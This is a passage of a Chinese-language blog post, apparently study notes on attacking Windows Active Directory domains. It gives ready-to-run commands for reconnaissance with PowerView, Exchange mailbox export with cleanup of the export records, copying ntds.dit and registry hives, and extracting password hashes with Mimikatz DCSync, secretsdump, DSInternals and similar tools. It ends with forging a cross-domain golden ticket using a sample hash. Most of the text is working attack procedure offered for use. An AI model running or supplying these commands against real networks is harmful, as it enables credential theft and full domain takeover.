#本机执行脚本不受限制，执行远程脚本，必须经过签名</code></pre><p>修改策略</p><pre><code>Get-Executionpolicy  #查看当前策略Set-Executionpolicy Unrestricted # 修改策略</code></pre><p><strong>使用Powerview进行信息搜集</strong></p><pre><code>-exec bypassImport-Module.\PowerView.ps1</code></pre><p>常用命令:</p><pre><code>Import-Module为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1命令格式：powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot; 定位域管理员powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; Invoke-UserHunter&#125;&quot; 更多PowerView命令参数Get-NetDomain: 获取当前用户所在域的名称Get-NetUser: 获取所有用户的详细信息Get-NetDomainController: 获取所有域控制器的信息Get-NetComputer: 获取域内所有机器的详细信息Get-NetOU: 获取域中的OU信息Get-NetGroup: 获取所有域内组和组成员信息Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息Get-NetShare: 获取当前域内所有网络共享信息Get-NetSession: 获取指定服务器的会话Get-NetRDPSession: 获取指定服务器的远程连接Get-NetProcess: 获取远程主机的进程Get-UserEvent: 获取指定用户的日志Get-ADObiect: 获取活动目录的对象Get-NetGPO: 获取域内所有的组策略对象Get-DomainPolicy: 获取域默认策略或域控制器策略Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</code></pre><h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><p>网络层隧道:</p><ul><li><p>IPv6隧道</p></li><li><p>ICMP隧道 (ping ip)</p></li></ul><p>传输层隧道:</p><ul><li>TCP (nc ip port)</li><li>UDP</li></ul><p>应用层隧道:</p><ul><li>SSH</li><li>HTTP(curl ip:port)</li><li>DNS(nslookup <a href="http://www.baidu.com/">www.baidu.com</a> vps-ip)(dig @vps-ip <a href="http://www.baidu.com/">www.baidu.com</a>)</li></ul><p><strong>ICMP隧道</strong></p><p>ICMP隧道工具有：PingTunnel、icmptunnel、icmpsh、powershell、icmp等</p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>exchange邮件服务器</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220701171227982.png" alt="image-20220701171227982"></p><p>客户端/远程访问接口和协议</p><ul><li>OWA</li><li>ECP</li><li>EWS</li></ul><p>基于端口扫描发现:</p><ul><li>25端口 SMTP的指纹显示为Exchange smtpd</li><li>80端口为 iis 8.5</li><li>443端口</li></ul><p>SPN查询</p><ul><li><pre><code>setspn -T pentest.com -F -Q */*</code></pre></li></ul><p><strong>Exchange基本操作</strong></p><p>查看Mailbox数据库</p><ul><li><pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre></li><li><pre><code>add-pssnapin microsoft.exchange*</code></pre></li></ul><p>获取现有用户邮件地址</p><ul><li>查看全部用户邮箱使用信息</li></ul><pre><code>Get-Mailbox | Format-Tables Name,WindowsEmailAddress</code></pre><ul><li>查看指定用户邮箱使用信息</li></ul><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalltemSize,LastLogonTime</code></pre><ul><li>查看全部用户邮箱使用信息</li></ul><pre><code>Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalltemSize-Descend</code></pre><p><strong>添加权限</strong></p><ul><li><p>查看用户角色权限</p><pre><code>Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre></li><li><p>添加用户角色权限</p></li></ul><pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><ul><li>删除用户角色权限</li></ul><pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><p><strong>设置网络共享文件夹</strong></p><pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><p><strong>清理痕迹</strong></p><ul><li>查看之前产生的导出请求记录</li></ul><pre><code>Get-MailboxExportRequest</code></pre><ul><li>删除导出请求记录</li></ul><pre><code>Remove-MailboxExportRequest -Identity Administrator\mailboxexport</code></pre><h2 id="攻击域控制器"><a href="#攻击域控制器" class="headerlink" title="攻击域控制器"></a>攻击域控制器</h2><h3 id="导出ntds-dit工具使用"><a href="#导出ntds-dit工具使用" class="headerlink" title="导出ntds.dit工具使用"></a><strong>导出ntds.dit工具使用</strong></h3><h4 id="ntdsutil工具提取"><a href="#ntdsutil工具提取" class="headerlink" title="ntdsutil工具提取"></a>ntdsutil工具提取</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702110915019.png" alt="image-20220702110915019"></p><p>命令:</p><p>创建快照:</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>挂载快照:</p><pre><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></pre><p>拷贝快照:</p><pre><code>copy C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p>卸载并删除快照:</p><pre><code>ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></pre><p>查看快照</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></pre><h4 id="vssadmin工具导出"><a href="#vssadmin工具导出" class="headerlink" title="vssadmin工具导出"></a>vssadmin工具导出</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702112559750.png" alt="image-20220702112559750"></p><p>命令:</p><p>创建快照:</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>复制文件</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,dit</code></pre><p>删除快照</p><pre><code>vssadmin delete shadows /for=c : /quite</code></pre><h4 id="利用vssown-vbs提取"><a href="#利用vssown-vbs提取" class="headerlink" title="利用vssown.vbs提取"></a>利用vssown.vbs提取</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702113237136.png" alt="image-20220702113237136"></p><pre><code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></pre><pre><code>cscript vssown.vbs /start #启动卷影复制服务cscipt vssown.vbs/create c #创建一个c盘的卷影副本copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,ditescript vssown.vbs /list #列出当前卷影副本escript vssown.vbs /delete #删除卷影副本</code></pre><h4 id="NTDSUTIL的IFM"><a href="#NTDSUTIL的IFM" class="headerlink" title="NTDSUTIL的IFM"></a>NTDSUTIL的IFM</h4><pre><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot;q q</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114121276.png" alt="image-20220702114121276"></p><h4 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114210607.png" alt="image-20220702114210607"></p><h4 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702151613418.png" alt="image-20220702151613418"></p><p>DiskShadow可以用来执行命令</p><p>示例:</p><p>将命令写入文件:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153003868.png" alt="image-20220702153003868"></p><p>使用diskshadow执行</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153216260.png" alt="image-20220702153216260"></p><p>使用diskshadow导出ntds.dit</p><p>将下列命令写入到command.txt文件</p><pre><code>set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;cmd.exe&quot; /c copy k:\\windows\\ntds\\ntds.dit c:\\ntds.ditdelete shadows alllist shadows allresetexit</code></pre><p>然后执行</p><pre><code>diskshadow /s C:\\command.txt # 注意这里需要进入C:\Windows\System32目录下执行，否则会报错</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702154731904.png" alt="image-20220702154731904"></p><p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit 的密钥，所以没有该密钥，将无法查看ntds.dit中的信息</p><p>system.hive文件在</p><pre><code>C:\Windows\System32\config</code></pre><p>直接使用注册表命令将system.live文件导出到当前路径</p><pre><code>reg save hklm\system system.hive #同理sam也可以这样导出 reg save hklm\sam sam.hive</code></pre><h3 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a><strong>解析ntds.dit</strong></h3><h4 id="使用esedbexport和ntdsxtract恢复ntds-dit提取其散列值"><a href="#使用esedbexport和ntdsxtract恢复ntds-dit提取其散列值" class="headerlink" title="使用esedbexport和ntdsxtract恢复ntds.dit提取其散列值"></a>使用esedbexport和ntdsxtract恢复ntds.dit提取其散列值</h4><p>esedbexport安装:</p><p>在kali下载libesedb</p><pre><code class="shell">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz</code></pre><p>下载安装依赖环境</p><pre><code class="shell">apt-get install autoconf automake autopoint libtool pkg-config</code></pre><p>解压</p><pre><code class="shell">tar -xzvf libesedb-experimental-20210424.tar.gz</code></pre><p>配置</p><pre><code class="shell">cd libesedb-20210424./configure</code></pre><p>编译</p><pre><code class="shell">make</code></pre><p>安装</p><pre><code class="shell">sudo make install</code></pre><p>配置</p><pre><code class="shell">sudo ldconfig</code></pre><p>安装完成后会在<code>/usr/local/bin</code>目录下看到<code>esedbexport</code>程序</p><p>将<code>ntds.dit</code>文件上传到kali中，使用<code>esedbexport</code>进行恢复操作</p><pre><code class="shell">esedbexport -m table ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702170750923.png" alt="image-20220702170750923"></p><p>提取根据ntds.dit的散列值提取其内容的方法:</p><p>使用ntdsxtract</p><p>安装命令:</p><pre><code class="shell">git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtract/python setup.py build &amp;&amp; python setup.py install</code></pre><p>安装完成后，我们将上一步中导出的“ntds.dit.export”文件夹中的datatable.3、link_table.5这两个表和之前获得的“SYSTEM”文件一并放入ntdsxtract的文件夹中。然后我们就可以执行如下命令，将域内的所有用户及散列值导出到result.txt文件中</p><pre><code class="shell">dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;</code></pre><p>命令:</p><pre><code class="shell">python dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt# –pwdformat选项是选择以什么格式进行提取，有john(John format)、ocl(oclHashcat)、ophc(OphCrack)三个选项。</code></pre><p>最终获得文件</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162054315.png" alt="image-20220706162054315"></p><p>Ntdsxtract中还具有一个“dscomputers.py”工具可以从分离出来的表中提取域中计算机信息。这对于离线分析目标信息是非常有用的。</p><p>在使用过程中，需要对它提供datatable，输出目录以及输出文件，输出文件的格式为csv：</p><pre><code class="shell">python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile domain_computers_info.csv </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162710090.png" alt="image-20220706162710090"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162817060.png" alt="image-20220706162817060"></p><h4 id="使用Impacket中的secretsdump"><a href="#使用Impacket中的secretsdump" class="headerlink" title="使用Impacket中的secretsdump"></a>使用Impacket中的secretsdump</h4><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>secretsdump.py是Impacket工具包中的一个脚本，该脚本实现了多种不需要在远程主机上执行任何代理的情况下转储机密数据的技术。对于SAM和LSA Secrets（包括缓存的凭据），我们尽可能的尝试从注册表中读取，然后将hives保存在目标系统（％SYSTEMROOT％\Temp目录）中，并从那里读取其余的数据。</p><p>secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到Ntds.dit和SYSTEM这两个文件。</p><p>使用方法:</p><pre><code class="shell">git clone https://github.com/SecureAuthCorp/impacketcd impacketsudo python3 setup.py installcd ..cd examplepython3 secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706222324453.png" alt="image-20220706222324453"></p><h4 id="PowerShell下的利用"><a href="#PowerShell下的利用" class="headerlink" title="PowerShell下的利用"></a>PowerShell下的利用</h4><p>DSInternals PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p><p>支持系统：</p><ul><li>Windows Server 2012 R2</li><li>Windows Server 2008 R2</li><li>Windows 10 64-bit</li><li>Windows 8.1 64-bit</li><li>Windows 7 64-bit</li></ul><p>安装与配置方法：</p><pre><code class="shell">PowerShell 5.0：Install-Module DSInternals或Install-Module -Name DSInternals -RequiredVersion 3.2.1PowerShell 3.0、4.0：解压压缩包 cd C:\DSInternalsImport-Module .\DSInternals</code></pre><p>使用DSInternals模块提取用户哈希值，我们需要先获取Ntds.dit、SYSTEM这两个文件。将Ntds.dit、SYSTEM这两个文件导出并拖到我们本地后，即可执行如下命令获取所有账户哈希：</p><pre><code class="shell">Import-Module DSInternals       // 导入DSInternals模块// 获取所有账户信息：$key = Get-Bootkey -SystemHivePath &#39;C:\目录\system.hive&#39;    Get-ADDBAccount -All -DBPath &#39;C:\目录\ntds.dit&#39; -Bootkey $key</code></pre><p>还可以导出支持Hashcat格式的哈希：</p><pre><code class="shell">$key = Get-Bootkey -SystemHivePath &#39;C:\目录\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\目录\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt</code></pre><h4 id="使用NTDSDumpex-exe可以导出散列值"><a href="#使用NTDSDumpex-exe可以导出散列值" class="headerlink" title="使用NTDSDumpex.exe可以导出散列值"></a>使用NTDSDumpex.exe可以导出散列值</h4><p>使用NTDSDumpex.exe可以进行导出散列值的操作。</p><p>将ntds.dit、NTDSDumpex.exe、system.hive 放在同一目录下，输入如下命令即可导出域账号和散列值。</p><p>NTDSDumpEx.exe下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx">https://github.com/zcgonvh/NTDSDumpEx</a></p><p>获取key：reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</p><p>使用NTDSDumpEx获取所有域用户的Hash</p><pre><code class="shell">NTDSDumpEx.exe -d ntds.dit -s system.hive -o hash.txt</code></pre><h4 id="在线利用dcsync获取提取Ntds-dit中的哈希"><a href="#在线利用dcsync获取提取Ntds-dit中的哈希" class="headerlink" title="在线利用dcsync获取提取Ntds.dit中的哈希"></a>在线利用dcsync获取提取Ntds.dit中的哈希</h4><p>DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。</p><p>Mimikatz下载地址：<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>利用Mimikatz的dcsync功能获取提取Ntds.dit中的哈希的操作如下：</p><p>在域内任意一台主机上运行mimikatz并执行如下命令：</p><pre><code>lsadump::dcsync /domain:xxx.com /all /csvlsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706225104256.png" alt="image-20220706225104256"></p><p>或者</p><pre><code class="shell">privilege::debugloglsadump::lsa /inject</code></pre><h4 id="在线-PowerShell提取Ntds-dit中的哈希"><a href="#在线-PowerShell提取Ntds-dit中的哈希" class="headerlink" title="在线-PowerShell提取Ntds.dit中的哈希"></a>在线-PowerShell提取Ntds.dit中的哈希</h4><p>即Invoke-DCSync.ps1脚本。</p><p>下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。</p><p>在域内任何一台主机上面执行如下命令：</p><pre><code class="shell">Set-Executionpolicy bypassImport-Module .\Invoke-DCSync.ps 1Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hashInvoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // 导出域内administrator账户的hash</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102847191.png" alt="image-20220707102847191"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102954770.png" alt="image-20220707102954770"></p><h4 id="在线-使用metasploit获取域散列"><a href="#在线-使用metasploit获取域散列" class="headerlink" title="在线-使用metasploit获取域散列"></a>在线-使用metasploit获取域散列</h4><ul><li>Ntds.dit(也被称为Active Directory database)包含了当前域用户中所有的用户的账号信息和其hash值</li><li>默认路径: C:\Windows\NTDS</li><li>只能通过域控制器进程和协议访问</li></ul><p>可能用到的模块:</p><pre><code>post/windows/gather/ntds_location #该模块可查看路径ntdspost/windows/gather/smart_hashdump #在线导出域账户hash(建议2012以上使用)auxiliary/admin/smb/psexec_ntdsgrab #利用域管账户，导出ntds必要文件到本地post/windows/gather/ntds_grabber #利用powershell将ntds必要文件下载到本地后使用post/windows/gather/credentials/domain_hashdump #介绍其方法</code></pre><h4 id="在线-使用vshadow和QuarksPwDump导出域账号和域散列值"><a href="#在线-使用vshadow和QuarksPwDump导出域账号和域散列值" class="headerlink" title="在线-使用vshadow和QuarksPwDump导出域账号和域散列值"></a>在线-使用vshadow和QuarksPwDump导出域账号和域散列值</h4><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre><code class="shell">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive</code></pre><p>shadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>在这个项目中，作者已经给出了shadow.exe:</p><p><a href="https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy">https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162512699.png" alt="image-20220707162512699"></p><p>选择对应版本下载即可</p><p>将这三个程序放到一个文件夹中，执行ShowCopy.bat</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162553598.png" alt="image-20220707162553598"></p><p>执行后:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162651423.png" alt="image-20220707162651423"></p><p>使用 esentutl 修复导出的 ntds.dit 文件:</p><pre><code class="shell">esentutl /p /o ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162752787.png" alt="image-20220707162752787"></p><p>最后通过 QuarksPwDump.exe 导出域账号和散列值:</p><pre><code class="shell">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o result.txt</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162932295.png" alt="image-20220707162932295"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162952291.png" alt="image-20220707162952291"></p><h2 id="跨域攻击分析及防御"><a href="#跨域攻击分析及防御" class="headerlink" title="跨域攻击分析及防御"></a>跨域攻击分析及防御</h2><h3 id="域间信任概述"><a href="#域间信任概述" class="headerlink" title="域间信任概述"></a>域间信任概述</h3><p><strong>为什么会有域信任?</strong></p><p>在同一个域内，管理员可以实现资源的统一管理、分配。有些企业会用到多个域，创建域间信任可以方便跨域资源分配。</p><p><strong>信任是有方向的:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170708834.png" alt="image-20220707170708834"></p><p><strong>信任传递:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170843465.png" alt="image-20220707170843465"></p><p><strong>域树和域林:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171001846.png" alt="image-20220707171001846"></p><p><strong>域间信任实例:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171110376.png" alt="image-20220707171110376"></p><p><strong>域间信任分类</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171153927.png" alt="image-20220707171153927"></p><h3 id="域间信任信息收集、利用思路"><a href="#域间信任信息收集、利用思路" class="headerlink" title="域间信任信息收集、利用思路"></a>域间信任信息收集、利用思路</h3><p><strong>环境搭建</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171848435.png" alt="image-20220707171848435"></p><p><strong>查看域间信任</strong></p><p>命令:</p><pre><code class="shell">nltest /domain_trusts  /primary 仅返回计算机账户属于的域 # 如nltest /domain_trusts /primary/forest 仅返回主域同一森林下的域/direct_out 返回被主域明确信任的域/direct_in 返回明确信任主域的域/all_trusts 返回所有已信任的域/V 显示详细的输出，包括域的SIDs和GUIDs</code></pre><pre><code>netdom query trust #只能在域控上使用</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711230039383.png" alt="image-20220711230039383"></p><p><strong>工具:</strong></p><p><strong>收集域详细信息:</strong></p><p>powerview</p><p>下载链接:<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一般不允许执行，可使用ISESteroids模块绕过</p><pre><code class="shell">PowerShell.exe -ExecutionPolicy Bypass -command &quot;..\powerview.ps1;Get-NetDomainTrust&quot;</code></pre><p>adfind：</p><p>下载链接:<a href="http://www.joeware.net/freetools/tools/adfind/">http://www.joeware.net/freetools/tools/adfind/</a></p><ul><li>-appver：显示adfind版本信息</li><li>-b：指定要查询的根节点basedn</li><li>-bit：指定位查询</li><li>-c:  只统计数量</li><li>-csv：导出为csv格式</li><li>-dn：只显示dn，不返回详细信息</li><li>-f：LDAP过滤条件，指定ldap语法</li><li>-h：指定主机与端口(ip:port)</li><li>-recmute：删除dn下面没有的</li><li>-s：搜索的范围， 有 one(当前层级)/sub(一层一层递归)，默认是sub</li><li>-sdna：非域管查询sd信息</li><li>-t：查询超时时间，默认120秒</li><li>-u：指定用户</li><li>-up：指定用户的密码</li></ul><pre><code>adfind.exe -h ip -sc u:* #如 AdFind.exe -h WIN-OSOIFGPM536.sakura.com -sc u:Administrator</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710000000436.png" alt="image-20220710000000436"></p><p>adexplorer</p><p>下载链接:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer</a></p><p>输入域控的账号密码就可以进行管理</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710092143570.png" alt="image-20220710092143570"></p><p><strong>收集域网络信息:</strong></p><p>nltest、ping、dnscmd</p><pre><code>nltest /domain_trustsnltest /dclist:companyping sakura.comdnscmd /enumzones</code></pre><p><strong>利用思路</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710093631488.png" alt="image-20220710093631488"></p><h3 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h3><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094448657.png" alt="image-20220710094448657"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094713427.png" alt="image-20220710094713427"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094732640.png" alt="image-20220710094732640"></p><h4 id="SIDHistory介绍和利用"><a href="#SIDHistory介绍和利用" class="headerlink" title="SIDHistory介绍和利用"></a>SIDHistory介绍和利用</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094901181.png" alt="image-20220710094901181"></p><p><strong>利用域信任密钥获取目标域权限</strong></p><ul><li><p>存在信任账户的情况下：Dcsync获取信任账号的NTLM值</p></li><li><pre><code>Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125; #如何无法找到Get-ADuser命令，则导入模块 import-module activedirectory</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231847885.png" alt="image-20220711231847885"></p><ul><li><pre><code class="shell">.\mimikatz.exe &quot;lsadump::dcsync /user:sakura$@HY.sakura.com&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231746078.png" alt="image-20220711231746078"></p><hr><ul><li><p>内部信任:lsadump获取信任账号的NTLM值</p></li><li><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:sakura$&quot; &quot;lsadump::trust /patch&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711232854715.png" alt="image-20220711232854715"></p><p><strong>信任票据的创建</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710102754875.png" alt="image-20220710102754875"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /rc4:56de60dc2e57db6b03fc5e9834965f26 /user:sakura /service:krbtgt /target:sakura.com 